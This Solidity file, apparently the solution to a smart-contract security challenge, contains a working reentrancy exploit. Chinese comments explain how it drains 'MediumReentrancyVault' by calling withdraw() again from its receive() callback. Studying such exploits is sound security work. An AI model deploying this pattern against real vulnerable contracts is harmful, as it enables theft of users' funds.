// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGame {
    function withdraw() external;
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title Attacker - MediumReentrancyVault 重入攻击合约
 * 
 * 攻击流程:
 *   1. attack() 收到 ETH → deposit(小额, 如 0.1 ETH) → balanceOf = 0.1
 *   2. attack() 调 g.withdraw():
 *      - 读取 amount = 0.1 ETH
 *      - msg.sender.call{value: 0.1}("") → 触发本合约 receive()
 *      - receive() 再次调 g.withdraw() ← 重入! balanceOf 还是 0.1
 *      - 循环直到金库 ETH < 0.1
 *   3. 所有重入结束后, balanceOf[attacker] = 0 (最后一次 withdraw 重置)
 *   4. 金库被 drain 干净 → check() → passed = true
 */
contract Attacker {
    IGame public g;

    /**
     * @notice 攻击入口
     * @param g_ Game 合约地址
     * 
     * 关键: deposit 用小额 (0.1 ETH)，这样重入可以反复提款 drain 整个金库
     * 如果 deposit 全部 ETH (10 ETH)，第一次 withdraw 就提走了自己的钱，
     * 重入时金库只剩 seed，可能不够一次提款导致 revert
     */
    function attack(IGame g_) external payable {
        g = g_;
        
        // 存入小额 ETH (约 0.1 ETH，留余量给 gas)
        uint256 depositAmount = address(this).balance > 0.15 ether ? 0.1 ether : address(this).balance;
        g.deposit{value: depositAmount}();
        
        // 触发第一次 withdraw → 启动重入循环
        g.withdraw();
    }

    /**
     * @notice 重入回调 - 每次 Game.withdraw() 转账时触发
     */
    receive() external payable {
        if (address(g) == address(0)) return;

        uint256 b = g.balanceOf(address(this));
        // 只有余额 > 0 且金库够付时才继续重入
        if (b > 0 && b <= address(g).balance) {
            g.withdraw();
        }
    }
}
